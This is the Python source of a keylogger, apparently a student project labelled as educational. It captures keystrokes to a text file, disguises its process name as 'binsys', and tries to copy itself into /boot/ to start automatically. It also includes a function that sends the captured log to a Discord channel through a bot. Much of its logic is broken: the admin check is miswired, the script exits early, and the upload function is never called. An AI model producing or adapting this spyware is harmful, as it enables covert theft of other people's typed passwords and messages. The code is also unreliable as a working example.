#╔════╗       ╔═══╗╔═══╗╔╗         ╔═══╗        
#╚══╗ ║       ║╔═╗║║╔═╗║║║         ║╔═╗║        
#  ╔╝╔╝╔══╗╔═╗║║ ║║║╚═╝║║║ ╔╗╔╗╔══╗║║ ║║╔═╗ ╔══╗
# ╔╝╔╝ ║╔╗║║╔╝║║ ║║║╔══╝║║ ║║║║║══╣║║ ║║║╔╗╗║╔╗║
#╔╝ ╚═╗║║═╣║║ ║╚═╝║║║   ║╚╗║╚╝║╠══║║╚═╝║║║║║║║═╣
#╚════╝╚══╝╚╝ ╚═══╝╚╝   ╚═╝╚══╝╚══╝╚═══╝╚╝╚╝╚══╝
#
#   Github: https://github.com/Zer0plusOne      Discord: @zer0who       Instagram: @sanchez_g2k04                                      
#   This code was made with educational purposes by a ENTI-UB cybersecurity student. [currently in first curse]



from pynput.keyboard import Listener, Key
import os
import setproctitle
import sys
import ctypes
import discord
import asyncio
import threading
import time

# Startea el programa en segundo plano
def run_in_background():
    thread = threading.Thread(target=run_as_root)
    thread.start()

# Ejecuta el script como administrador

def run_as_root(program):
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Si el programa se ejecuta como usuario, cierra
if run_as_root() == False:
    print("ejecuta el programa como administrador para su funcionamiento")
    sys.exit()

# Pregunta al usuario si quiere ejecutar el archivo como administrador
ask = input("Es necesario ejecutar el script como administrador (y/n)")
if ask == "y":
    run_as_root()

if ask == "n": 
    sys.exit()
else:
    sys.exit()

# Forzar la creación del archivo de texto
create_txt = "keylog.txt"
open(create_txt, 'w').close()

# Mover el archivo a la carpeta de boot en Kali (autoejecución)
source_file = "keylogger.py"  # Cambia esto al archivo fuente correcto si es diferente
destination_directory = "/boot/"

if os.path.exists(source_file) and os.path.exists(destination_directory):
    destination_file = os.path.join(destination_directory, os.path.basename(source_file))

    try:
        os.rename(source_file, destination_file)
    except Exception as e:
        pass
else:
    pass

# Cambiar el nombre del proceso del script
setproctitle.setproctitle("binsys")

# Define el archivo de salida de las teclas
output_file = "keylog.txt"

# Función de escritura de las teclas al archivo
def write_to_file(key):
    with open(output_file, "a") as f:
        if hasattr(key, 'char') and key.char is not None:
            f.write(key.char + "\n")

# Función de salida al presionar una tecla
def on_press(key):
    if key == Key.f12:
        print("Tecla F12 detectada, terminando el proceso...")
        return False  # Detener la escucha del teclado
    write_to_file(key)

# Iniciar la escucha del teclado
with Listener(on_press=on_press) as listener:
    print("Escuchando el teclado...")
    listener.join()   

# Envio de mensaje a canal de discord especificado
def send_to_discord(channel_id, bot_token):
    channel_id = str("")
    bot_token = str("")
    # Crea un cliente de discord
    client = discord.Client()

    @client.event
    async def on_ready():
        print(f"Bot en linea. Nombre:{client.user}")
        # Lee y muestra el archivo de texto 
        with open("keylog.txt", "r") as file:
            content = file.read()
            # Especifica el canal en el que se enviará el mensaje
            channel = client.get_channel(channel_id)
            # Envia el mensaje
            await channel.send(content)
            # Espera de un minuto
            await asyncio.sleep(60)
        
        # Start el cliente con la token especificada
        client.run(bot_token)



#      █████                                    ███                                                             
#   ██████           ██                          ███                                                            
#  ██   █  █    ██  █  █                          ██                                                            
# █    █  █    ███ █                              ██                                                            
#     █  █     ████               ██   ████       ██      ████                                      ███  ████   
#    ██ ██    █ ██          ███    ██    ███  █   ██     █ ███  █    ████         ████        ███    ████ ████ █
#    ██ ██   █             █ ███   ██     ████    ██    █   ████    █  ███  █    █  ███  █   █ ███    ██   ████ 
#    ██ █████             █   ███  ██      ██     ██   ██    ██    █    ████    █    ████   █   ███   ██        
#    ██ ██ ███           ██    ███ ██      ██     ██   ██    ██   ██     ██    ██     ██   ██    ███  ██        
#    ██ ██   ███         ████████  ██      ██     ██   ██    ██   ██     ██    ██     ██   ████████   ██        
#    █  ██    ███        ███████   ██      ██     ██   ██    ██   ██     ██    ██     ██   ███████    ██        
#       █       ███      ██        ██      ██     ██   ██    ██   ██     ██    ██     ██   ██         ██        
#   ████         ███     ████    █  █████████     ██    ██████    ██     ██    ██     ██   ████    █  ███       
#  █  █████        ███  █ ███████     ████ ███    ███ █  ████      ████████     ████████    ███████    ███      
# █    ███           ███   █████            ███    ███               ███ ███      ███ ███    █████              
# █                                  █████   ███                          ███          ███                      
#  █                               ████████  ██                     ████   ███   ████   ███                     
#   █                             █      ████                     ███████  ██  ███████  ██                      
#    ██                                                          █     ████   █     ████                        
#
